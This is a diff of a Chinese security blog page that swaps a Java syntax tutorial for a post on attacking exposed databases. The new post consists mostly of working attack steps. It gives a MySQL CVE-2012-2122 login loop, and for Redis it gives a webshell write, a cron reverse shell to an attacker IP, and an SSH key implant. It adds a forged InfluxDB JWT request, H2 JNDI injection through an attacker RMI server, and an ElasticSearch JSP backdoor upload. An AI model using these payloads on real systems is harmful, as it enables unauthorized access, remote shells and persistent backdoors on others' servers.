@@ -4,28 +4,18 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="Java基础语法(Part-1), 白芨的小屋">
-    <meta name="description" content="Java基础1、注释
-单行注释
+    <meta name="keywords" content="服务安全-数据库, 白芨的小屋">
+    <meta name="description" content="数据库常见服务应用的安全测试：
 
-//单行注释
+配置不当-未授权访问
+安全机制-特定安全漏洞
+安全机制-弱口令爆破攻击
 
+服务安全测试流程：
 
-多行注释
-
-/*
-	多行注释
-	多行注释
-	多行注释
-*/
-
-
-文档注释
-
-//Javadoc：文档注释  /**  */
-/**
-*@Description HelloWorld
-*@A">
+判断服务是否开放：端口扫描、组合猜测、信息来源
+判断服务类型：数据库、文件传输、远程控制、数据通信
+判断利用方">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -37,7 +27,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>Java基础语法(Part-1) | 白芨的小屋</title>
+    <title>服务安全-数据库 | 白芨的小屋</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
@@ -329,12 +319,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/banner/java.jpeg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/banner/database.jpeg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">Java基础语法(Part-1)</h1>
+                    <h1 class="description center-align post-title">服务安全-数据库</h1>
                 </div>
             </div>
         </div>
@@ -450,8 +440,12 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/Java/">
-                                <span class="chip bg-color">Java</span>
+                            <a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/">
+                                <span class="chip bg-color">数据库</span>
+                            </a>
+                        
+                            <a href="/tags/%E6%9C%AA%E6%8E%88%E6%9D%83/">
+                                <span class="chip bg-color">未授权</span>
                             </a>
                         
                     </div>
@@ -462,8 +456,8 @@
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/Java%E7%AF%87/" class="post-category">
-                                Java篇
+                            <a href="/categories/%E6%9C%8D%E5%8A%A1%E5%AE%89%E5%85%A8/" class="post-category">
+                                服务安全
                             </a>
                         
                     </div>
@@ -475,7 +469,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2022-02-28
+                    2022-05-09
                 </div>
                 
 
@@ -484,7 +478,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.2k
+                    1.9k
                 </div>
                 
 
@@ -504,228 +498,179 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="Java基础"><a href="#Java基础" class="headerlink" title="Java基础"></a>Java基础</h1><h2 id="1、注释"><a href="#1、注释" class="headerlink" title="1、注释"></a>1、注释</h2><ul>
-<li>单行注释</li>
-</ul>
-<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//单行注释</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+                <h1 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h1><p><strong>常见服务应用的安全测试：</strong></p>
+<ol>
+<li>配置不当-未授权访问</li>
+<li>安全机制-特定安全漏洞</li>
+<li>安全机制-弱口令爆破攻击</li>
+</ol>
+<p><strong>服务安全测试流程：</strong></p>
+<ol>
+<li><strong>判断服务是否开放：</strong>端口扫描、组合猜测、信息来源</li>
+<li><strong>判断服务类型：</strong>数据库、文件传输、远程控制、数据通信</li>
+<li><strong>判断利用方式：</strong>特性漏洞、未授权访问、弱口令爆破</li>
+</ol>
+<h2 id="1、Mysql"><a href="#1、Mysql" class="headerlink" title="1、Mysql"></a>1、Mysql</h2><h3 id="2-1、未授权访问"><a href="#2-1、未授权访问" class="headerlink" title="2.1、未授权访问"></a>2.1、未授权访问</h3><p><strong>Mysql默认端口：3306</strong></p>
+<p><strong>漏洞编号：CVE-2012-2122</strong></p>
+<p><strong>漏洞利用：</strong></p>
+<pre class="line-numbers language-none"><code class="language-none">for i in &#96;seq 1 1000&#96;; do mysql -uroot -pwrong -h ip -P3306  ; done<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
+<h3 id="2-2、口令猜测"><a href="#2-2、口令猜测" class="headerlink" title="2.2、口令猜测"></a>2.2、口令猜测</h3><p><strong>Mysql</strong>默认配置本地登录<code>root</code>用户，拒绝远程连接。</p>
+<p>猜解口令需借助类似<code>phpmyadmin</code>的第<strong>三方数据库管理应用</strong>（搭建在对方服务器，数据发送由本地到本地）。</p>
+<h2 id="2、Redis"><a href="#2、Redis" class="headerlink" title="2、Redis"></a>2、Redis</h2><p><strong>Redis-未授权访问-配置不当</strong></p>
+<p><strong>原理：</strong></p>
+<p>​    <strong>Redis</strong> 默认情况下，会绑定在<strong>0.0.0.0:6379</strong>，<!--0.0.0.0任意ip可访问-->如果没有进行采用相关的策略，比如<strong>添加防火墙规则</strong>避免其他非信任来源 ip 访问等，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问目标服务器器的情况下<strong>未授权访问 Redis</strong> 以及读取 Redis 的数据。</p>
+<p><strong>配置问题：</strong></p>
+<p>bind 注释符开启，表示只允许本地访问</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">/etc/redis.conf
+<span class="token comment"># bind 127.0.0.1</span>
+protected-mode no<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="2-1、漏洞测试："><a href="#2-1、漏洞测试：" class="headerlink" title="2.1、漏洞测试："></a><strong>2.1、漏洞测试：</strong></h3><p>在本机搭建<strong>redis客户端（redis-cli远程连接工具）</strong>连接目标地址。</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">redis-cli -h 目标ip
+info <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<h3 id="2-2、利用实例："><a href="#2-2、利用实例：" class="headerlink" title="2.2、利用实例："></a>2.2、<strong>利用实例：</strong></h3><p> <strong>Redis</strong> 自身的提供的 <strong>config</strong> 命令，可以进行<strong>写文件操作</strong></p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 1、Webshell写入													#前提知道web路径				</span>
+config <span class="token builtin class-name">set</span> <span class="token function">dir</span> /var/tmp										<span class="token comment">#设置WEB写入目录，目录需有可读写权限</span>
+config <span class="token builtin class-name">set</span> dbfilename test.php						<span class="token comment">#设置写入文件名</span>
+<span class="token builtin class-name">set</span> <span class="token builtin class-name">test</span> <span class="token string">"&lt;?php phpinfo();?>"</span>							<span class="token comment">#设置写入文件代码</span>
+save																			<span class="token comment">#保存执行 或者使用 bgsave</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 2、计划任务反弹shell			</span>
+config <span class="token builtin class-name">set</span> <span class="token function">dir</span> /var/spool/cron/crontabs																			<span class="token comment">#设置写入计划任务目录</span>
+config <span class="token builtin class-name">set</span> dbfilename xxx																										<span class="token comment">#设置写入文件名</span>
+<span class="token builtin class-name">set</span> xx <span class="token string">"<span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span>* * * * * bash -i >$ /dev/tcp/120.55.xx.xx/3333 0>&amp;1<span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span>"</span>		<span class="token comment">#设置写入文件代码,在120.55.xx.xx监听</span>
+save																																				<span class="token comment">#保存执行 或者使用 bgsave</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>攻击者可成功将自己的 ssh 公钥写入目标服务器的<code>／root /. ssh </code>文件夹的 <code>authotrized keys</code> 文件中，进而可以使用对应私钥直接使用 ssh 服务登录目标服务器器、添加计划任务、写入Webshell等操作。 </p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 3、写入Linux ssh-key公钥</span>
+<span class="token comment"># 利用条件：（1）允许异地登录（2）Redis服务使用ROOT账号启动（3）安全模式protected-mode处于关闭状态（4）允许使用密钥登录，即可远程写入一个公钥，直接登录远程服务器</span>
+
+ssh-keygen -t rsa																								<span class="token comment">#生成公钥</span>
+<span class="token builtin class-name">cd</span> /root/.ssh/
+<span class="token punctuation">(</span>echo -e <span class="token string">"<span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">;</span> <span class="token function">cat</span> id_rsa.pub<span class="token punctuation">;</span> <span class="token builtin class-name">echo</span> -e <span class="token string">"<span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">)</span> <span class="token operator">></span> key.txt			<span class="token comment">#将公钥写入key.txt</span>
+<span class="token function">cat</span> key.txt <span class="token operator">|</span> redis-cli -h xx.xx.xx.xx -x <span class="token builtin class-name">set</span> hack							<span class="token comment">#读取公钥并远程连接目标服务器xx.xx.xx.xx并设置为hack</span>
+config <span class="token builtin class-name">set</span> <span class="token function">dir</span> /root/.ssh/																			<span class="token comment">#设置写入文件目录</span>
+config <span class="token builtin class-name">set</span> dbfilename authorized_keys														<span class="token comment">#设置写入文件名</span>
+save
+<span class="token builtin class-name">cd</span> /root/.ssh/
+<span class="token function">ssh</span> -i id_rsa root@xx.xx.xx.xx																	<span class="token comment">#使用攻击主机去连接xx.xx.xx.xx</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 4、RCE反弹shell</span>
+https://github.com/n0b0dyCN/redis-rogue-server
+python redis-rogue-server.py --rhost xx.xx.xx.xx --lhost <span class="token number">120.55</span>.xx.xx --exp<span class="token operator">=</span>exp.so
+																												<span class="token comment">#	攻击目标主机反弹到120.55.xx.xx;本机监听端口21000</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="3、Influxdb"><a href="#3、Influxdb" class="headerlink" title="3、Influxdb"></a>3、Influxdb</h2><p><strong>Influxdb-未授权访问-Jwt验证不当</strong></p>
+<p><strong>默认端口：8086 8088</strong></p>
+<p><strong>数据库介绍：</strong>Go写成，着力于<strong>高性能的查询与存储时序型数据</strong>，被广泛应用于<strong>存储系统的监控数据，IOT行业的实时数据</strong>等场景。</p>
+<p><strong>漏洞原因：</strong><code>influxdb</code>是一款著名的<strong>时序数据库</strong>，其使用<code>jwt</code>作为鉴权方式。</p>
 <ul>
-<li>多行注释</li>
+<li>在用户开启了认证</li>
+<li>且未设置参数<code>shared-secret</code>的情况下</li>
 </ul>
-<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">/*
-	多行注释
-	多行注释
-	多行注释
-*/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><code>jwt</code>的认证密钥为<strong>空字符串</strong>，此时攻击者可以<strong>伪造任意用户身份</strong>在<code>influxdb</code>中执行<code>SQL</code>语句。</p>
+<p><strong>影响版本： InfluxDB &lt; 1.7.6</strong> 的版本</p>
+<p><strong>漏洞复现：</strong></p>
+<p>通过<code>vulhub</code>搭建环境<code>InfluxDB 1.6.6</code></p>
+<p>（1）借助<code>https://jwt.io/</code>来生成<code>jwt token</code>：</p>
+<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
+  <span class="token property">"alg"</span><span class="token operator">:</span> <span class="token string">"HS256"</span><span class="token punctuation">,</span>
+  <span class="token property">"typ"</span><span class="token operator">:</span> <span class="token string">"JWT"</span>
+<span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#123;</span>
+  <span class="token property">"username"</span><span class="token operator">:</span> <span class="token string">"admin"</span><span class="token punctuation">,</span>
+  <span class="token property">"exp"</span><span class="token operator">:</span> <span class="token number">1676346267</span>
+<span class="token punctuation">&#125;</span>
+<span class="token comment">//admin是一个已经存在的用户，exp是一个时间戳，代表着这个token的过期时间，你需要设置为一个未来的时间戳。</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<ul>
-<li>文档注释</li>
-</ul>
-<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//Javadoc：文档注释  /**  */</span>
-<span class="token comment">/**
-*@Description HelloWorld
-*@Author 白芨
-*/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>（2）发送数据包触发未授权</p>
+<pre class="line-numbers language-none"><code class="language-none">POST &#x2F;query HTTP&#x2F;1.1
+Host: your-ip
+Accept-Encoding: gzip, deflate
+Accept: *&#x2F;*
+Accept-Language: en
+Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNjc2MzQ2MjY3fQ.NPhb55F0tpsp5X5vcN_IkAAGDfNzV5BA6M4AThhxz6A
+User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)
+Connection: close
+Content-Type: application&#x2F;x-www-form-urlencoded
+Content-Length: 22
 
-<h2 id="2、标识符"><a href="#2、标识符" class="headerlink" title="2、标识符"></a>2、标识符</h2><p>Java所有组成部分都需要名字，<strong>类名</strong>、<strong>变量名</strong>以及<strong>方法名</strong>都称为标识符。</p>
-<ul>
-<li>所有标识符应该以字母（ A-Z 或者 a-z ）美元符（ $ ）下划线( _ ) 开始</li>
-<li><strong>不能使用关键字作为变量名、方法名</strong></li>
-<li>标识符<strong>大小写敏感</strong></li>
-</ul>
-<h2 id="3、数据类型"><a href="#3、数据类型" class="headerlink" title="3、数据类型"></a>3、数据类型</h2><p><strong>强类型语言</strong></p>
-<ul>
-<li>要求变量使用严格符合规定，所有变量要求先定义才能使用</li>
-</ul>
-<h3 id="基本类型（primitive-type）"><a href="#基本类型（primitive-type）" class="headerlink" title="基本类型（primitive type）"></a>基本类型（primitive type）</h3><p><em><strong>八大基本数据类型</strong></em></p>
-<table>
-<thead>
-<tr>
-<th>数值类型</th>
-<th></th>
-<th></th>
-<th></th>
-<th></th>
-</tr>
-</thead>
-<tbody><tr>
-<td>整数类型</td>
-<td><code>byte</code>占<code>1</code>个字节；</td>
-<td><code>short</code>占<code>2</code>个字节；</td>
-<td><code>int</code>占<code>4</code>个字节；</td>
-<td><code>long</code>占<code>8</code>个字节,<code>long</code>类型要在数字后加<code>L</code>;</td>
-</tr>
-<tr>
-<td>浮点类型</td>
-<td><code>double</code>占<code>8</code>个字节</td>
-<td></td>
-<td></td>
-<td><code>float</code>占<code>4</code>个字节,<code>float</code>类型要在数字后加<code>F</code>；</td>
-</tr>
-<tr>
-<td>字符类型</td>
-<td><code>char</code>占<code>2</code>个字节</td>
-<td></td>
-<td></td>
-<td></td>
-</tr>
-</tbody></table>
-<table>
-<thead>
-<tr>
-<th>Boolean</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>占<code>1</code><strong>位</strong>，其值只有<code>true</code>和<code>false</code>两个。</td>
-</tr>
-</tbody></table>
-<p><strong>补充：</strong></p>
-<p><strong>位</strong>（<code>bit</code>）：计算机内部<strong>数据存储</strong>最小单位</p>
-<p><strong>字节</strong>（<code>byte</code>）：计算机<strong>数据处理</strong>基本单位，习惯用大写<strong>B</strong>表示。</p>
-<p><code>1B（byte，字节）=8bit（位）</code></p>
-<h3 id="引用类型（reference-type）"><a href="#引用类型（reference-type）" class="headerlink" title="引用类型（reference type）"></a>引用类型（reference type）</h3><ul>
-<li>类</li>
-<li>接口</li>
-<li>数组</li>
-</ul>
-<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//整数扩展：进制表示： 二进制0b		八进制0		十进制		十六进制0x</span>
-<span class="token comment">//浮点数扩展：有限 离散 舍入误差 接近但不等于；最好完全避免使用浮点数进行比较</span>
-<span class="token comment">//字符扩展：所有字符本质还是数字；Unicode编码表：两个字节 0-65536；表示：\u0061 = a</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+db&#x3D;sample&amp;q&#x3D;show users<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<h3 id="类型转换"><a href="#类型转换" class="headerlink" title="类型转换"></a>类型转换</h3><p>Java是强类型语言，运算时需将不同类型数据转换为同一类型然后进行运算。</p>
-<p>优先级低 -&gt; 高：byte、short、char、-&gt; int  -&gt; long -&gt; float -&gt; double</p>
-<ul>
-<li>强制类型转换：(类型)变量名         高-&gt;低</li>
-<li>自动类型转换</li>
-</ul>
-<p>​    <em>1、不能对布尔值转换</em></p>
-<p>​    <em>2、不能把对象类型转换为不相干类型</em></p>
-<p>​    <em>3、转换时可能存在内存溢出，或精度问题</em></p>
-<h2 id="4、变量、常量"><a href="#4、变量、常量" class="headerlink" title="4、变量、常量"></a>4、变量、常量</h2><ul>
-<li>Java每个变量必须声明其类型</li>
-<li>Java变量是程序中最基本的<strong>存储单元</strong>，其类型包括<strong>变量名</strong>、<strong>变量类型</strong>、<strong>作用域</strong></li>
-<li>每个变量都有类型，可以是<strong>基本类型</strong>、也可以是<strong>引用类型</strong></li>
-<li>变量名必须是合法标识符</li>
-<li>变量声明是一条完整语句，以分号<code>;</code>结束。</li>
-</ul>
-<p><strong>变量：</strong></p>
-<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//局部变量,写方法中；只在对应方法中生效。</span>
-		<span class="token comment">//main方法</span>
-    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-        <span class="token comment">//局部变量，必须声明和初始化值</span>
-        <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>
-        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span>
-<span class="token comment">//---------------------------------------</span>
-<span class="token comment">//实例变量：写在类之内，方法之外。从属于对象；</span>
-<span class="token comment">/*如果不自行初始化，输出对应类型的默认值；
-	数值：0 0.0 
-	布尔：false
-	除基本类型其余默认值：null
-*/</span>
-<span class="token comment">//----------------------------------------</span>
-<span class="token comment">//类变量：static</span>
-<span class="token comment">//从属于类</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h2 id="4、H2database"><a href="#4、H2database" class="headerlink" title="4、H2database"></a>4、H2database</h2><p><strong>H2database-未授权访问-配置不当</strong></p>
+<p><strong>默认端口：20051</strong></p>
+<p><strong>数据库介绍：</strong><code>H2 database</code>是一款<code>Java</code>内存数据库，多用于单元测试。</p>
+<p><strong>漏洞原因：</strong><code>H2 database</code>自带一个Web管理页面，在<code>Spirng</code>开发中，如果我们设置如下选项，即可<strong>允许外部用户访问Web管理页面，且没有鉴权</strong>。</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java">spring<span class="token punctuation">.</span>h2<span class="token punctuation">.</span>console<span class="token punctuation">.</span>enabled<span class="token operator">=</span><span class="token boolean">true</span> 
 
-<p>命名规范：</p>
-<ul>
-<li>所有变量、方法名、类名：见名知意</li>
-<li>类成员变量、类名、方法名：首字母小写驼峰原则<strong>monthSalary</strong></li>
-<li>常量：大写字母和下划线<strong>MAX_VALUE</strong></li>
-</ul>
-<p><strong>常量：</strong></p>
-<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//常量 初始化后不能再改变，一般使用大些字符</span>
-<span class="token comment">//final 修饰符，不存在先后顺序</span>
-<span class="token keyword">final</span> 常量名 <span class="token operator">=</span> 值；
-<span class="token keyword">final</span> <span class="token keyword">double</span> PI <span class="token operator">=</span> <span class="token number">3.14</span>； <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+spring<span class="token punctuation">.</span>h2<span class="token punctuation">.</span>console<span class="token punctuation">.</span>settings<span class="token punctuation">.</span>web<span class="token operator">-</span>allow<span class="token operator">-</span>others<span class="token operator">=</span><span class="token boolean">true</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
-<h2 id="5、运算符、字符串连接符"><a href="#5、运算符、字符串连接符" class="headerlink" title="5、运算符、字符串连接符"></a>5、运算符、字符串连接符</h2><h3 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h3><ul>
-<li>算数运算符</li>
-</ul>
-<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">/* -------------------------------------
-	加、减、乘、除、取余（模运算）、自增、自减；
-	‘+’ 、 ‘-’ 、 ‘*’ 、’/‘（注意类型）、‘%’ 、‘++’、‘--’；
-	--------------------------------------
-*/</span>
-<span class="token comment">//例：’a++‘(先执行后自增)、‘++a’(先自增后执行)</span>
-<span class="token comment">//幂运算(java 中无 '^'; 需借助工具类如下2^3表示：)</span>
-    <span class="token keyword">double</span> pow <span class="token operator">=</span> <span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">pow</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>pow<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>利用这个管理页面，我们可以进行<strong>JNDI注入攻击</strong>，进而在目标环境下执行任意命令。</p>
+<p><strong>漏洞利用：</strong></p>
+<p>（1）下载JNDI-Injection-Exploit</p>
+<pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;github.com&#x2F;welk1n&#x2F;JNDI-Injection-Exploit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<ul>
-<li><p>赋值运算符 =</p>
-</li>
-<li><p>关系运算符 <code>&#39;&gt;&#39;、&#39;&lt;&#39;、&#39;&gt;=&#39;、&#39;&lt;=&#39;、‘==’、&#39;!=&#39;</code></p>
-</li>
-</ul>
-<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">/*-----------------------------------
-大于、小于、大于等于、小于等于、等于、不等于
-'>'、'&lt;'、'>='、'&lt;='、‘==’、'!='
- ------------------------------------
-*/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>（2）生成执行RMI Payload-URL</p>
+<p><code>-C 执行命令 -A 服务器地址</code></p>
+<pre class="line-numbers language-none"><code class="language-none">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C touch &#x2F;tmp&#x2F;success -A 120.55.xx.xx<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<ul>
-<li>逻辑运算符<code>’&amp;&amp;(与)‘、  ’||（或）‘、  ‘!（非）’</code></li>
-<li>位运算符</li>
-</ul>
-<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">/*----------------------------------------------------------
-与、或、异或（相同为0，不同为1）、取反、左移(2&lt;&lt;3 == 2*2*2*2)、右移
-'&amp;'、'|'、 '^'、 '~'、'&lt;&lt;'、‘>>’
- -----------------------------------------------------------
-*/</span>
-<span class="token comment">/*--------------
-例：
-A = 0011 1100
-B = 0000 1101
-  
-A&amp;B = 0000 1100
-A|B = 0011 1101
-A^B = 0011 0001
-~B = 1111 0010
----------------
-*/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>（3）填入URL提交执行</p>
+<pre class="line-numbers language-none"><code class="language-none">Driver Class：javax.naming.InitialContext
 
-<ul>
-<li>条件运算符  </li>
-</ul>
-<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//例：</span>
-<span class="token comment">//x ? y : z;</span>
-<span class="token comment">//x 若为true则结果为y；false则结果为z；</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+JDBC URL：rmi:&#x2F;&#x2F;120.55.xx.xx:1099&#x2F;kd1rns<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
-<ul>
-<li>扩展赋值运算符<code>（a+=b）等于 a=a+b</code></li>
-</ul>
-<h3 id="字符串连接符"><a href="#字符串连接符" class="headerlink" title="字符串连接符"></a>字符串连接符</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java">a <span class="token operator">=</span> <span class="token number">10</span>
-b <span class="token operator">=</span> <span class="token number">8</span>
-<span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token operator">+</span>a<span class="token operator">+</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//108</span>
-<span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>a<span class="token operator">+</span>b<span class="token operator">+</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//18</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<h2 id="5、CouchDB"><a href="#5、CouchDB" class="headerlink" title="5、CouchDB"></a>5、CouchDB</h2><p><strong>CouchDB-权限绕过配合RCE-漏洞</strong></p>
+<p><strong>默认端口：5984</strong></p>
+<p><strong>影响版本：</strong>小于 1.7.0 以及 小于 2.1.1</p>
+<p><strong>Apache CouchDB</strong>是一个开源数据库，专注于易用性和成为”完全拥抱web的数据库”。它是一个使用<code>JSON</code>作为<strong>存储格式</strong>，<code>JavaScript</code>作为<strong>查询语言</strong>，<code>MapReduce</code>和<code>HTTP</code>作为<strong>API</strong>的<strong>NoSQL数据库</strong>。应用广泛，如BBC用在其动态内容展示平台，<code>Credit Suisse</code>用在其内部的商品部门的市场框架，Meebo，用在其社交平台（web和应用程序）</p>
+<p><strong>CouchDB-权限绕过-CVE-2017-12635</strong></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/blob/master/couchdb/CVE-2017-12636/exp.py">https://github.com/vulhub/vulhub/blob/master/couchdb/CVE-2017-12636/exp.py</a></p>
+<h2 id="6、ElasticSearch"><a href="#6、ElasticSearch" class="headerlink" title="6、ElasticSearch"></a>6、ElasticSearch</h2><p>常用于配合<code>kibana</code>进行日志分析，数据分析</p>
+<p><strong>ElasticSearch-文件写入&amp;RCE-漏洞</strong></p>
+<p><strong>默认端口：9200 9300</strong></p>
+<h3 id="6-1、Elasticsearch-RCE-CVE-2014-3120"><a href="#6-1、Elasticsearch-RCE-CVE-2014-3120" class="headerlink" title="6.1、Elasticsearch RCE CVE-2014-3120"></a><strong>6.1、Elasticsearch RCE CVE-2014-3120</strong></h3><p><a target="_blank" rel="noopener" href="https://vulhub.org/#/environments/elasticsearch/CVE-2014-3120/">https://vulhub.org/#/environments/elasticsearch/CVE-2014-3120/</a></p>
+<h3 id="6-2、Elasticsearch-文件写入-wooyun-2015-110216"><a href="#6-2、Elasticsearch-文件写入-wooyun-2015-110216" class="headerlink" title="6.2、Elasticsearch 文件写入 wooyun_2015_110216"></a>6.2、Elasticsearch 文件写入 wooyun_2015_110216</h3><p><strong>9200</strong>一般为<code>ElasticSearch</code>的常用端口，<strong>此漏洞环境需要与中间件使用</strong></p>
+<p>（1）发现9200端口存在elasticsearch页面，8080存在tomcat目录</p>
+<p>（2）利用<code>ElasticSearch</code>写入后门到<code>/usr/local/tomcat/webapps/wwwroot/</code></p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 创建一个恶意索引文档：</span>
+<span class="token function">curl</span> -XPOST http://目的ip:9200/yz.jsp/yz.jsp/1 -d'
+<span class="token punctuation">&#123;</span><span class="token string">"&lt;%new java.io.RandomAccessFile(application.getRealPath(new String(new byte[]&#123;47,116,101,115,116,46,106,115,112&#125;)),new String(new byte[]&#123;114,119&#125;)).write(request.getParameter(new String(new byte[]&#123;102&#125;)).getBytes());%>"</span><span class="token builtin class-name">:</span><span class="token string">"test"</span><span class="token punctuation">&#125;</span>
+<span class="token comment">#102:ascii -> f</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 
